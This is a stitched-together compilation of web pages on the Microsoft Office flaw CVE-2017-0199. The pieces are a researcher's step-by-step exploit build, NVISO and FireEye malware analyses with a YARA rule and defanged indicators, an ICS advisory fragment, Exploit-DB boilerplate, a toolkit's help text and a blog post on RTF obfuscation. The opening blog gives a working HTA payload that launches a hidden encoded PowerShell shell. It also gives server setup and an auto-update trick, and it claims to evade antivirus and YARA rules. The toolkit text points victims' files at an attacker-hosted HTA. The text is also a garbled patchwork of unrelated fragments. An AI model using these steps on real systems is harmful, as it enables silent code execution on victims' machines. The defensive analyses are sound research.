[avril 14, 2017](http://rewtin.blogspot.com/2017/04/cve-2017-0199-practical-exploitation-poc.html "permanent link")

### **Introduction**

Since several days the security community has been informed  thanks to [FireEye publication](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html) of different malware campaigns (Dridex...) spreaded using CVE-2017-0199.

Several other publications were related to this vulnerability but no working exploit was published.

After digging a while I found the way to exploit this vulnerability in an easy way, which seems to be a bit different than the current works already done by other researchers.

I decided to publish this work as Microsoft officially published a patch on 11 of Apr 2017.

### Technical background

It is possible to include OLEv2 links to existing documents.
These objects (once included) will reflect the current content of the source link once loaded in the document.
What is amazing is that if you try to include HTA link as an OLEv2 object it will be executed once (at the creation) but Winword will return an error like:

|  |
| --- |
|  |

The problem in this case is that the HTA file will not be persistent (to make it persistent you would have had to Link it with file + create icon but we want to be stealth and to have autorun right ?)

After thinking a while I started by thinking how to handle a real, not malicious OLE object link to a remote RTF file... To achieve i had to play a little bit with content-type and DAV module in Apache to serve my file in the "proper" Microsoft Office expected way... (this will be discussed in next chapters).

From there, I will have a valid embeded Object link automatically updated after each open of my document !

Next step ? Modify the document at the source with my payload in HTA!?!

In this scenario, I was able to:

- Create a  dynamic OLEv2 object link for a real RTF file

- Modify the RTF at the source with my payload

- Bypass the error generated if I wanted to create a direct link to HTA document

Another issue ? The OLE object needed to be activated autmatically !

I had much help to solve all these issues relaying on different articles in the reference part ! Thanks to Didier Stevens blog, Vincent Yiu (mainly inspired from its article), Nvisio labs, FireEye and obviously... Microsoft :)

**Step 1**

Prepare an HTA file: (HTA file are HTML application which can run JScript and VBscript)

Let's call it "**ms.hta**"

```
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
   <html xmlns="http://www.w3.org/1999/xhtml">
   <head>
   <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
   <title>Bonjour</title>
 <script language="VBScript">
  Set owFrClN0giJ = CreateObject("Wscript.Shell")
  Set v1ymUkaljYF = CreateObject("Scripting.FileSystemObject")
  If v1ymUkaljYF.FileExists(owFrClN0giJ.ExpandEnvironmentStrings("%PSModulePath%") + "..\powershell.exe") Then
   owFrClN0giJ.Run "powershell.exe -nop -w hidden -e ENCODED_B64_SHELL"
  End If
 </script>
 <hta:application
     id="oHTA"
     applicationname="Bonjour"
     application="yes"
   >
   </hta:application>
   </head>
   <div>
   <object type="text/html" data="http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender" width="100%" height="100%">
   </object></div>
   <body>
   </body>
   </html>

```

**Step 2**

Create a simple RTF document using Winword with the any random content. (in our example the string "This is my official and legit content")

Call it "**ms.rtf**"

**Step 3**

Push these 2 files on a webserver you have full control on.

We supposed it will be stored in /var/www/html

Now we have to configure Apache to be able to include the ms.rtf as a link
```
 a2enmod dav
 a2enmod dav_fs
 a2enmod dav_lock
 a2enmod headers
 service apache2 restart

```

The following directive will :

- Add "Content-Type application/rtf to all files in /ms

- Allow the PROPFIND request performed by Microsoft Office

```
 Modify virtualhost and include:
```
```

 <Directory /var/www/html/ms/>
 Header set Content-Type "application/rtf"
 </Directory>
 <Directory />
 Dav on
 </Directory>

```
```
service apache2 restart
```

**Step 4**

Create a simple RTF document using Winword "**exploit.rtf**" This will be our exploit !

**Insert -> Object**

|  |
| --- |
| CVE-2017-0199 Creation of OLEv2 external link |

After clicking OK you will get the content of the "ms.rtf" file which just contains a random string..

Save the file as "**exploit.rtf**"

|  |
| --- |
| CVE-2017-0199 Olev2 link object created |

**At this step we can close Winword and go to the next step for changing the content of ms.rtf with the HTA payload...**

**Step 5**

The following step will :

- change the ms.rtf that we have included with the custom HTA payload

- The web server will send a "application/hta" content-type... this will be interpreted by the Winword client which will run mshta to handle this content-type and execute our payload

```
 cat /var/www/html/ms/ms.hta > /var/www/html/ms.rtf
```
```

 vi /etc/apache2/sites-enables/000-default
 Change -> application/rtf to application/hta
 like:
```
```

```
```

 <Directory /var/www/html/ms/>
 Header set Content-Type "application/hta"
 </Directory>
```
```

```
```

 service apache2 restart

```

**Step 6**

At this step, if the user opens the "exploit.rtf" file he will have to double click on the link object to launch the attack...

If we want the OLE object to be loaded automatically at the opening of the document we have to edit the exploit.rtf file and change:

to
\object\objautlink\**objupdate**\rsltpict..........................

**At this step the exploit is built.**

**Exploitation:**

Once the user open the document the OLE object is updated trhough the link and mshta is execute thanks to the application/hta content-type delivered by the server

Result: code is executed !

Meterpreter is here !

We don't care about the warning as the code was already executed...

|  |
| --- |
| CVE-2017-0199 Exploited ! warning **after** execution |

**Detection using current AV/published YARA rules**

From my personal tests it seems that this method is not currently catched by AV (Defender already have signature for CVE-2017-0199)

Additionnally current published yara rules does not match this exploit

rule rtf\_objdata\_urlmoniker\_http {

 strings:

 $header = "{\\rtf1"

 $objdata = "objdata 0105000002000000" nocase

 $urlmoniker = "E0C9EA79F9BACE118C8200AA004BA90B" nocase

 $http = "68007400740070003a002f002f00" nocase

 condition:

 $header at 0 and $objdata and $urlmoniker and $http

 }

Indeed urlmoniker does not match, which will never trigger this yara rule.

Background About a year ago my team and I had were called to perform a forensic analysis on a customer network. The reason for this was that a computer was first infected by a ransomware, and for some (unknown) reasons, several other workstations were getting "infected" after only 3 hours. After 5 hours (time of my intervention) I discovered that: - 80% of the workstations were infected - The network was partially segmented but the infection occurs on all segments - A malware process was even running on the file Server as... "Domain Administrator" :-/ - No track of 4624 (Logon Type 3) events or any other track of lateral movements/authentications Interesting... hum :) In this article I will describe my analysis of the threat and also how to take advantage of this method in a "safer" and more "controlled" way to  move laterally (or even perform privesc) in red team operations. (practical exploitation code will be provided). ...

# Analysis of a CVE-2017-0199 Malicious RTF Document

There is a [new exploit](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html) (CVE-2017-0199) going around for which a patch was released by Microsoft on 11/04/2017. In this post, we analyze an [RTF document](https://www.virustotal.com/en/file/ae48d23e39bf4619881b5c4dd2712b8fabd4f8bd6beb0ae167647995ba68100e/analysis/) exploiting this vulnerability and provide a YARA rule for detection.

[rtfdump.py](https://blog.didierstevens.com/2017/02/25/update-rtfdump-py-version-0-0-5/) is a Python tool to analyze RTF documents. Running it on our sample produces a list with all “entities” in the RTF document (text enclosed between {}):

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170412-083137.png?w=625)

This is often a huge list with a lot of information. But here, we are interested in OLE 1.0 objects embedded within this RTF file. We can use the filter with option -f O for such objects:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170412-083156.png?w=625)

There are 2 entities (objdata and datastore) with indices 153 and 249 (this is a number generated by rtfdump, it is not part of the RTF code). The content of an object is encoded with hexadecimal characters in an RTF file,  entity 153 contains 5448 hexademical characters. So let’s take a look by selecting this entity for deeper analysis with option -s 153:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170412-083304.png?w=625)

In this hex/ascii dump, we can see that the text starts with 01050000 02000000, indicating an OLE 1.0 object. As the second line starts with d0cf11e0, we can guess it contains an OLE file.

With option -H, we can convert the hexadecimal characters to binary:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170412-083412.png?w=625)

Now we can see the string OLE2Link, which has often been referred to when talking about this zero-day. With option -i, we can get more information about the embedded object:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170412-083701.png?w=625)

So it is clearly an embedded OLE file, and the name OLE2Link followed by a zero byte was chosen to identify this embedded OLE file. With option -E, we can extract the embedded object:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170412-083747.png?w=625)

Since this is an OLE file, we can analyze it with [oledump.py](https://blog.didierstevens.com/programs/oledump-py/): we dump the file with option -d and pipe it into oledump:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170412-083823.png?w=625)

The OLE file contains 2 streams. Let’s take a look at the first stream:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170412-083919.png?w=625)

We can recognize a URL, let’s extract it with strings:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170412-083944.png?w=625)

Because of vulnerability CVE-2017-0199, this URL will automatically be downloaded. The web server serving this document, will identify it as an [HTA file](https://en.wikipedia.org/wiki/HTML_Application) via a Content-Type header:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170412-101253.png)

Because this download is performed by the [URL Moniker](https://msdn.microsoft.com/en-us/library/ms775149%28v%3Dvs.85%29.aspx), this moniker will recognize the content-type and open the downloaded file with Microsoft’s HTA engine. The [downloaded HTA file](https://www.virustotal.com/en/file/1c4c9e630c6e23bf2accf984385b09424f9efac938cee93db64434d5f0a6c433/analysis/) might look to us like an RTF file, but the HTA parser will find the VBS script and execute it:

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170412-101432.png?w=625)

This VBS script performs several actions, ultimately downloading and executing a [malicious executable](https://www.virustotal.com/en/file/6b6c00548e5e92127c8b2a78f02c1e9c9d10f5ef5aa98e3d1af14c0320d19ee2/analysis/).

**Detection**

Let’s take a second look at the first stream in the OLE file (the stream with the malicious URL):

![](https://blog.nviso.eu/wp-content/uploads/2017/04/20170412-090701.png?w=625)

The byte sequence that we selected here (E0 C9 EA 79 F9 BA CE 11 8C 82 00 AA 00 4B A9 0B), is the binary representation of the [URL Moniker](https://msdn.microsoft.com/en-us/library/ms775149%28v%3Dvs.85%29.aspx) GUID: {79EAC9E0-BAF9-11CE-8C82-00AA004BA90B}. Notice that the binary byte sequence and the text representation of the GUID is partially reversed, this is typical for GUIDs.

After the URL Moniker GUID, there is a length field, followed by the malicious URL (and then followed by a file closing sequence, …).

We use the following YARA rule to hunt for these RTF documents:

```

```

rule rtf_objdata_urlmoniker_http {
 strings:
 $header = &quot;{\\rtf1&quot;
 $objdata = &quot;objdata 0105000002000000&quot; nocase
 $urlmoniker = &quot;E0C9EA79F9BACE118C8200AA004BA90B&quot; nocase
 $http = &quot;68007400740070003a002f002f00&quot; nocase
 condition:
 $header at 0 and $objdata and $urlmoniker and $http
 }

```

Remark 1: we do not search for string OLE2Link

Remark 2: with a bit of knowledge of the RTF language, it is trivial to modify documents to bypass detection by this rule

Remark 3: the search for http:// (string $http) is case sensitive, and if you want, you can omit it (for example, it will not trigger on https).

Remark 4: there is no test for the order in which these strings appear

Happy hunting!

   Well, if you are correct this is a shock for me.

   What this seems to mean is that for example with any Windows server not fully up to date where the system is set up with Wordpad as default viewer for .txt files, it can be infected just by an administrator double clicking on a malicious rtf file renamed as a .txt file. Usually when you connect to a Windows server through TSE it is to do administrative tasks so the ‘connected as administrator’ is not a huge stretch. I have so many times double clicked on .txt files on network shares while logged as an administrator on Windows servers.

   Wordpad should be immediately deleted from all Windows servers. I never imagined that Microsoft has added Ole technology to this tool. Saying ‘Office is not installed on my servers, so there is no risk in double clicking a file’ seems now incredibly naive.

The MS Office DDE YARA rules that we published yesterday detected several malicious documents samples since 10/10/2017. Remark: the malicious samples we mention were detected with our DDEAUTO rule (Office\_DDEAUTO\_field); as we feared, the second rule (Office\_DDE\_field) is generating some false positives and we will update it.

ISP users are recommended to obtain available mitigating controls by accessing their InCenter account at this location:

<http://incenter.medical.philips.com>

Users with questions regarding their specific ISP installations are advised by Philips to contact their local Philips service support team or their regional service support.

Philips’ contact information is available at the following location:

<https://www.usa.philips.com/healthcare/solutions/customer-service-solutions>

Please see the Philips product security website for the latest security information for Philips products:

<https://www.philips.com/productsecurity>

NCCIC recommends users take defensive measures to minimize the risk of exploitation of these vulnerabilities. Specifically, users should:

* Minimize network exposure for all control system devices and/or systems, and ensure that they are [not accessible from the Internet](/ics/alerts/ICS-ALERT-10-301-01).
* Locate all medical devices and remote devices behind firewalls, and isolate them from the business network.
* When remote access is required, use secure methods, such as Virtual Private Networks (VPNs), recognizing that VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize that VPN is only as secure as the connected devices.

NCCIC also provides a section for [control systems security recommended practices](/ics/content/recommended-practices) on the ICS-CERT web page. NCCIC reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.

Additional mitigation guidance and recommended practices are publicly available in the NCCIC Technical Information Paper, [ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies](/ics/tips/ICS-TIP-12-146-01B), that is available for download from the [ICS-CERT website](/ics/).

Organizations observing any suspected malicious activity should follow their established internal procedures and report their findings to NCCIC for tracking and correlation against other incidents.

This vulnerability allows a malicious actor to download and execute a Visual Basic script containing PowerShell commands when a user opens a document containing an embedded exploit. FireEye has observed Office documents exploiting CVE-2017-0199 that download and execute malware payloads from different well-known malware families.

FireEye shared the details of the vulnerability with Microsoft and has been coordinating public disclosure timed with the release of a patch by Microsoft to address the vulnerability, which can be found [here.](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199)

The vulnerability bypassed most mitigations prior to patch availability; however, FireEye email and network products detected the malicious documents. FireEye recommends that Microsoft Office users apply the [patch from Microsoft](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199).

#### Attack Scenario

The attack occurs in the following manner:

1. A threat actor emails a Microsoft Word document to a targeted user with an embedded OLE2 embedded link object
2. When the user opens the document, winword.exe issues a HTTP request to a remote server to retrieve a malicious HTA file
3. The file returned by the server is a fake RTF file with an embedded malicious script
4. Winword.exe looks up the file handler for application/hta through a COM object, which causes the Microsoft HTA application (mshta.exe) to load and execute the malicious script

In the two documents that FireEye observed prior to the initial blog acknowledging these attacks, malicious scripts terminated the winword.exe processes, downloaded additional payloads, and loaded decoy documents. The original winword.exe process was terminated to conceal a user prompt generated by the OLE2link. Figure 1 shows this prompt.

#### Document 1 - (MD5: 5ebfd13250dd0408e3de594e419f9e01)

The first malicious document identified by FireEye had three stages. An embedded OLE2 link object causes winword.exe to reach out to the following URL to download the stage one malicious HTA file:

http[:]//46.102.152[.]129/template.doc

Once downloaded, the malicious HTA file is processed by the “application/hta” handler. The highlighted line in Figure 2 shows the first download occurring, followed by the additional malicious payloads.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/hta2_rgio.max-1000x1000.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/hta2_rgio.max-1000x1000.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/hta2_rgio.max-1000x1000.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/hta2_rgio.max-1000x1000.png)

Figure 2: Live attack scenario

Once downloaded, the template file was stored in the user’s temporary internet files with the name template[?].hta, where [?] is determined at run time.

#### The Logic Bug

Mshta.exe is responsible for handling the Content-Type “application/hta,” parsing the content, and executing the script. Figure 3 shows winword.exe querying registry value of CLSID for the “application/hta” handler.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/hta3_vyxu.max-1100x1100.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/hta3_vyxu.max-1100x1100.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/hta3_vyxu.max-1100x1100.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/hta3_vyxu.max-1100x1100.png)

Figure 3: Winword query registry value

Winword.exe makes a request to the DCOMLaunch service, which in turn causes the svchost.exe process hosting DCOMLaunch to execute mshta.exe. Mshta.exe then executes the script embedded in the malicious HTA document. Figure 4 shows the deobfuscated VBScript from the first stage download.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/hta4_cwms.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/hta4_cwms.max-1400x1400.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/hta4_cwms.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/hta4_cwms.max-1400x1400.png)

Figure 4: First document, stage one VBScript

The script shown in Figure 4 performs the following malicious actions:

1. Terminates the winword.exe process with taskkill.exe to hide the prompt shown in Figure 1.
2. Downloads a VBScript file from http[:]//www.modani[.]com/media/wysiwyg/ww.vbs and saving it to %appdata%\Microsoft\Windows\maintenance.vbs
3. Downloads a decoy document from http[:]//www.modani[.]com/media/wysiwyg/questions.doc and saving it to %temp%\document.doc
4. Cleans up the Word Resiliency keys for Word versions 15.0 and 16.0 so that Microsoft Word will restart normally
5. Executes the malicious stage two VBScript: %appdata%\Microsoft\Windows\maintenance.vbs
6. Opens the decoy document, %temp%\document.doc, to hide the malicious activity from the user

Once executed, the downloaded stage two VBScript (ww.vbs/maintenance.vbs) performs the following actions:

1. Writes an embedded obfuscated script to %TMP%/eoobvfwiglhiliqougukgm.js
2. Executes the script

The obfuscated eoobvfwiglhiliqougukgm.js script performs the following actions when executed:

1. Attempts to delete itself from the system
2. Attempts to download http[:]//www.modani[.]com/media/wysiwyg/wood.exe (at most 44 times), and save the file to %TMP%\dcihprianeeyirdeuceulx.exe
3. Executes %TMP%\dcihprianeeyirdeuceulx.exe

Figure 5 shows the process execution chain of events.

Table 1: First document file metadata

#### The LATENTBOT Payload

The payload associated with the first document is an updated version of the [LATENTBOT malware family](https://www.fireeye.com/blog/threat-research/2015/12/latentbot_trace_me.html). LATENTBOT is a highly-obfuscated BOT that has been in the wild since 2013.

The newer version of the LATENTBOT has different injection mechanisms for Windows XP (x86) and Windows 7 operating systems:

* **Attrib.exe patching** – The bot calls Attrib.exe, patches the entry in memory, and inserts a JMP instruction to transfer control to the mapped section. To map the section in the address space of atrrib.exe it uses ZwMapViewOfSection().
* **Svchost code Injection** – Attrib.exe starts the svchost.exe process in suspended mode, creates space, and allocates code by calling ZwMapViewOfSection().
* **Control transfer** – It then uses SetThreadContext() to modify the OEP of the primary thread, which will be executed in the remote process to trigger code execution.
* **Browser injection** – A similar process is used to inject the final payload into the default web browser with the help of NtMapVIewOfSection().

In Windows 7 or later operating systems, the bot does not use attrib.exe. Rather, it injects code into svchost.exe followed by launching the default browser with malicious payload by leveraging NtMapViewOfSection().

This variant then connects to the following command and control (C2) server:

![https://storage.googleapis.com/gweb-cloudblog-publish/images/hta-code1.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/hta-code1.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/hta-code1.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/hta-code1.max-800x800.png)

Upon successful communication with the C2 server, LATENTBOT generates a beacon. One of the decrypted beacons are as follows with an updated version number of 5015:

![https://storage.googleapis.com/gweb-cloudblog-publish/images/hta-code2.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/hta-code2.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/hta-code2.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/hta-code2.max-800x800.png)

At the time of analysis, the C2 server was offline. The bot comes with a highly modular plugin architecture and has been associated with the “Pony” campaigns as an infostealer.

As of April 10, 2017, the malware hosted at www.modani[.]com/media/wysiwyg/wood.exe has been updated and the C2 server has been moved to: 217.12.203[.]100.

#### Document 2 - (MD5: C10DABB05A38EDD8A9A0DDDA1C9AF10E)

The second malicious document identified by FireEye consisted of two malicious stages. The initial stage reached out to the following URL to download the stage one malicious HTA file:

http[:]//95.141.38[.]110/mo/dnr/tmp/template.doc

This file is downloaded into the user’s temporary internet files directory with the name template[?].hta, where [?] is determined at runtime. Once downloaded, winword.exe utilizes mshta.exe to parse the file. mshta.exe parses through file finding tags and executes the contained script. Figure 6 shows the deobfuscated script.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/hta6_hcvc.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/hta6_hcvc.max-1400x1400.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/hta6_hcvc.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/hta6_hcvc.max-1400x1400.png)

Figure 6: Second document, first stage VBScript

Figure 6 shows the following malicious actions:

1. Terminate the winword.exe process with taskkill.exe to hide the prompt shown in Figure 1
2. Download an executable from http[:]//95.141.38[.]110/mo/dnr/copy.jpg, saving it to '%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\winword.exe'
3. Download a document from http[:]//95.141.38[.]110/mo/dnr/docu.doc, saving it to %temp%\document.doc
4. Clean up the Word Resiliency keys for Word versions 15.0 and 16.0, so that Microsoft Word will restart normally
5. Execute the malicious payload at '%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\winword.exe'
6. Open the decoy document, %temp%\document.doc, to hide the malicious activity from the user

Examination of the malicious payload revealed that it is a variant of the dropper for what Microsoft calls [WingBird](http://download.microsoft.com/download/E/B/0/EB0F50CC-989C-4B66-B7F6-68CD3DC90DE3/Microsoft_Security_Intelligence_Report_Volume_21_English.pdf), which has similar characteristics as FinFisher. The malware is heavily obfuscated with several anti-analysis measures, including a custom VM to slow analysis. A [blog post by "Artem"](https://artemonsecurity.blogspot.com/2017/01/wingbird-rootkit-analysis.html) covers a payload driver of WingBird. The blog author briefly mentions the protection techniques of the dropper, which match this sample.

Table 2: Second document metadata

#### Conclusion

FireEye observed CVE-2017-0199, a vulnerability in Microsoft Word that allows an attacker to execute a malicious Visual Basic script. The CVE-2017-0199 vulnerability is a logic bug and bypasses most mitigations. Upon execution of the malicious script, it downloads and executes malicious payloads, as well as displays decoy documents to the user. The two documents achieve execution of their malicious payloads, with one containing LATENTBOT and the other containing WingBird/FinFisher. The malicious document contained only a link to the attacker controlled server, showing the advantage of FireEye’s MVX engine to detect multi-stage attacks. Further campaigns leveraging this attack have been observed prior to patch availability, but are not covered in this blog.

We recommend that Microsoft Office users apply the [patch](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199) as soon as possible.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

### Command line arguments:

```
# python cve-2017-0199_toolkit.py -h

This is a handy toolkit to exploit CVE-2017-0199 (Microsoft office RCE)

Modes:

-M gen                                          Generate Malicious file only

     Generate malicious RTF/PPSX file:

      -w <Filename.rtf/Filename.ppsx>     Name of malicious RTF/PPSX file (Share this file with victim).

      -u <http://attacker.com/test.hta>   The path to an HTA/SCT file. Normally, this should be a domain or IP where        this                                          tool is running.
                                      For example, http://attackerip.com/test.doc (This URL will be included in 	                                              malicious RTF/PPSX file and will be requested once victim will open malicious RTF file.
      -t RTF|PPSX (default = RTF)         Type of the file to be generated.
      -x 0|1  (default = 0)               Generate obfuscated RTF file. 0 = Disable, 1 = Enable.

-M exp                                          Start exploitation mode

# [Furoner.CAT](https://furoner.wordpress.com/)

## Furoner-a (m i f): Dit d'aquella persona apassionada per la informàtica, que té un viu interès per a explorar-ne les característiques i per a posar a prova les seves habilitats en aquest àmbit. (English translation in the About page)

 Written by [furoner](https://furoner.wordpress.com/author/furoner/)[July 6, 2017July 10, 2017](https://furoner.wordpress.com/2017/07/06/analysis-of-new-rtf-malware-obfuscation-method/)
# Analysis of “new” RTF malware obfuscation method

Earlier this morning someone sent me a suspicious email they received for analysis. This is a print screen of the email:

![original_email](https://furoner.wordpress.com/wp-content/uploads/2017/07/original_email.jpg?w=756)

The two documents attached were exactly the same file but with different names. My initial triage already determined the files to be malicious, as they were already submitted to [VT and with a detection count of 16/56](https://www.virustotal.com/file/91f5fb03f6e4829faa7e92c72fd0ca5ae430396fe3ac02f5cc6b496aa35ff4c5/analysis/1499324353/) (July 6th at 7:10 AM UTC). The file had first been uploaded just 11 minutes before by someone else for analysis, and detections were produced mostly by generic signatures for a malicious RTF obfuscated exploit:

![VT_detections](https://furoner.wordpress.com/wp-content/uploads/2017/07/vt_detections.jpg?w=756)

So thus I had an idea of what type of malware could it be: something related to the recent malicious RTF exploits leveraging CVE-2017-0199, as explained by [NViSO](https://blog.nviso.be/2017/04/12/analysis-of-a-cve-2017-0199-malicious-rtf-document/), [FireEye](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html) or [Fortinet](https://blog.fortinet.com/2017/06/04/an-inside-look-at-cve-2017-0199-hta-and-scriptlet-file-handler-vulnerability) last April 2017.

So using [Didier Stevens rtfdump tool](https://blog.didierstevens.com/2016/07/29/releasing-rtfdump-py/) (thanks Didier!) I could see all components of this RTF file. As expected, there were A LOT of components (5206), as it happens in most malicious RTF documents due to need for obfuscation.

![initial_rtfdump_viewjpg](https://furoner.wordpress.com/wp-content/uploads/2017/07/initial_rtfdump_viewjpg.jpg?w=756)

The file starts with a typical RTF header but without the F (the f is not needed for Microsoft Word to open RTF documents, and this is typically used by malware creators to avoid having the file scanned by some AV or to be submitted in sandboxes). Then it has one *object* with 2 nested objects: an *object class* and the *object data*. Inside the object data component there are all other 5204 components of this file, nested inside *\mmmailsubject* components.

My first idea is that there would be some kind of OLE file inside objects 3 or 4. So I selected object 3 and applied the option -H to convert the hexadecimal characters. This was just a string that was giving the file a title.

![rtfdump_object3](https://furoner.wordpress.com/wp-content/uploads/2017/07/rtfdump_object3.jpg?w=756)

But selecting object 4, rtfdump was not able to present any output. So, since all objects under object 3 are nested inside object 2, I tried selecting object 2 and I got the content of all subcomponents:

![rtfdump_object2](https://furoner.wordpress.com/wp-content/uploads/2017/07/rtfdump_object2.jpg?w=756)

With this, I knew I could open the file with [010 Editor](https://www.sweetscape.com/010editor/) without danger in order to make it easier to view and decipher.

![010_editor_initial_view](https://furoner.wordpress.com/wp-content/uploads/2017/07/010_editor_initial_view.jpg?w=756)

In the text editor it is easy to appreciate the *\mmmailsubject* tags. If we look at the official RTF specification document from Microsoft we can find a short explanation on this control word:

![RTF_specs_MSFT-mmmailsubject](https://furoner.wordpress.com/wp-content/uploads/2017/07/rtf_specs_msft-mmmailsubject.jpg?w=756)

So, from this explanation I concluded all content inside the \mmmailsubject nests could be ignored, leaving behind a trail of hexadecimal values that put together would probably become an interesting string.

![hexadecimal_values_between_ignored_nests](https://furoner.wordpress.com/wp-content/uploads/2017/07/hexadecimal_values_between_ignored_nests.jpg?w=756)

So I built a regex to match all nested components to be ignored and I tested it in a short sample of 2 nests on [regex101](https://regex101.com/). Bingo!

![nested_regex_test](https://furoner.wordpress.com/wp-content/uploads/2017/07/nested_regex_test.jpg?w=756)

I used the Find&Replace option with regular expressions built in 010 Editor to match all nests and remove them. This left me with the following:

![nests_ignored_rtf](https://furoner.wordpress.com/wp-content/uploads/2017/07/nests_ignored_rtf.jpg?w=756)

Notice that the resultant hex string includes the magic bytes of an OLE file, *d0cf11e*.

I saved this file as “deobfuscated-rtf.vir” into my analysis folder and proceeded to analyze it again with rtfdump. Now the output was much smaller:

![deobfuscated-rtfdump](https://furoner.wordpress.com/wp-content/uploads/2017/07/deobfuscated-rtfdump.jpg?w=756)

Since I knew the file embedded in object 4 was an OLE file, I could try to extract it and pipe it into oledump tool (also from Didier Stevens).

![deobfuscated-rtfdump-oledump](https://furoner.wordpress.com/wp-content/uploads/2017/07/deobfuscated-rtfdump-oledump.jpg?w=756)

And what was in those OLE objects? Yes, a **URL** pointing to an HTA file to download.

![deobfuscated-rtfdump-oledump-url](https://furoner.wordpress.com/wp-content/uploads/2017/07/deobfuscated-rtfdump-oledump-url.jpg?w=756)

I will not analyze the HTA file that would have been downloaded because it has already been analyzed by others before. What was kind of new in this case was the obfuscation used in this RTF malware sample.

Before you go out to figure out how to create a zero-day and you get confused, if you start with OffSec, that won't happen due to how methodologically all the training is put together.      ![Emile Kok](/_astro/emile.C3f2EqfQ.png)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
